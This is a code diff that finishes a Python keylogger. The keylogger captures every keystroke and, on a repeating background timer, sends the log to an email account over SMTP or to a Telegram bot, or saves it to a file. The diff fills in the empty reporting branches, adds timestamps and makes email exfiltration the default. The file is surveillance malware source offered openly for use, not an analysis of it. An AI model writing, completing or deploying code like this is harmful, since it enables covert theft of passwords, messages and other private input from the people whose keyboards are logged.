@@ -1,14 +1,13 @@
 import keyboard
 import requests
 import smtplib
-import schedule
-import time
+import datetime
 
 from re import fullmatch
 from contracts import contract, new_contract
-
+from threading import Timer
 from config import SEND_REPORT_EVERY, TELEGRAM_BOT_TOKEN, \
-                   EMAIL, EMAIL_PASSWORD, ADMIN_CHAT_ID
+                   EMAIL, PASSWORD, ADMIN_CHAT_ID
 
 
 @new_contract
@@ -37,7 +36,6 @@ class Keylogger:
         self.interval = interval
         self.report_method = report_method
         self.log = ""
-        self.name_report_file = 1
 
     @contract
     def report_to_email(self, email, password):
@@ -50,15 +48,14 @@ class Keylogger:
         :type email: str,validationCheckEmail
         :type password: str
         """
-        smtp = smtplib.SMTP(host=email, port=587)
+        smtp = smtplib.SMTP("", 465)
         smtp.starttls()
         smtp.login(email, password)
-        smtp.sendmail(email, email, "f")
+        smtp.sendmail(email, email, "Subject: Keylogger\n" + datetime.datetime.now().strftime("Date: %d/%m/%Y\nTime: %H:%M:%S\n----------------\n") + self.log)
         smtp.quit()
 
     @contract
     def report_to_telegram(self, bot_token, chat_id):
-        # TODO: new parameter: text. update doc/contract
         """
         This method sends reports via telegram bot
 
@@ -69,7 +66,7 @@ class Keylogger:
         :type chat_id: str
         """
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        request = requests.post(url, data={"chat_id": chat_id, "text": "f"})
+        request = requests.post(url, data={"chat_id": chat_id, "text": datetime.datetime.now().strftime("Date: %d/%m/%Y\nTime: %H:%M:%S\n----------------\n") + self.log})
         if request.status_code != 200:
             request.raise_for_status()
 
@@ -78,10 +75,7 @@ class Keylogger:
         This method ...
         """
         with open("text.txt", "w") as file:
-            print(self.log, file=file)
-
-    def update_name_report_file(self):
-        self.name_report_file += 1
+            print(datetime.datetime.now().strftime("Date: %d/%m/%Y\nTime: %H:%M:%S\n----------------\n") + self.log, file=file)
 
     def callback(self, event):
         """
@@ -99,17 +93,20 @@ class Keylogger:
         self.log += name
 
     def report(self):
-        if self.report_method == "email":
-
-        elif self.report_method == "telegram":
-
-
-        elif self.report_method == "file":
-
-
-        while True:
-            schedule.run_pending()
-            time.sleep(1)
+        """
+        This method ...
+        """
+        if self.log:
+            if self.report_method == "email":
+                self.report_to_email(EMAIL, PASSWORD)
+            elif self.report_method == "telegram":
+                self.report_to_telegram(TELEGRAM_BOT_TOKEN, ADMIN_CHAT_ID)
+            elif self.report_method == "file":
+                self.report_to_file()
+        self.log = ""
+        schedule = Timer(interval=self.interval, function=self.report)
+        schedule.daemon = True
+        schedule.start()
 
     def start(self):
         """
@@ -123,7 +120,7 @@ class Keylogger:
 def main():
     """
     """
-    keylogger = Keylogger(SEND_REPORT_EVERY, "file")
+    keylogger = Keylogger(SEND_REPORT_EVERY, "email")
     keylogger.start()
 
 
